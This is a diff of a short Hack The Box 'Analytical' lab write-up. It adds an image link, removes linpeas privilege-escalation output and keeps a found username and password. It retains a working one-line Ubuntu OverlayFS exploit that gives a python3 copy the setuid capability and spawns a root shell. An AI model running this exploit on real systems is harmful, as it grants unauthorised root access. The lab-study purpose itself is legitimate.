@@ -1,4 +1,5 @@
 # Introduction
+![image](https://github.com/Mate0r/app.hackthebock.com/assets/94843357/75b410be-4ccb-49d4-9b25-44ab30a983f0)
 
 # Nmap
 
@@ -33,20 +34,9 @@ in env variables, id to ssh
 metalytics
 An4lytics_ds20223#
 
-/etc/nginx/sites-enabled/data.analytical.htb
-
-╔══════════╣ Checking if containerd(ctr) is available
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                                                  
-ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it                                                                      
-ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"
-
-╔══════════╣ Checking if runc is available
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                            
-runc was found in /usr/bin/runc, you may be able to escalate privileges with it 
-
 # root.txt
-https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability
 
+https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
 
 
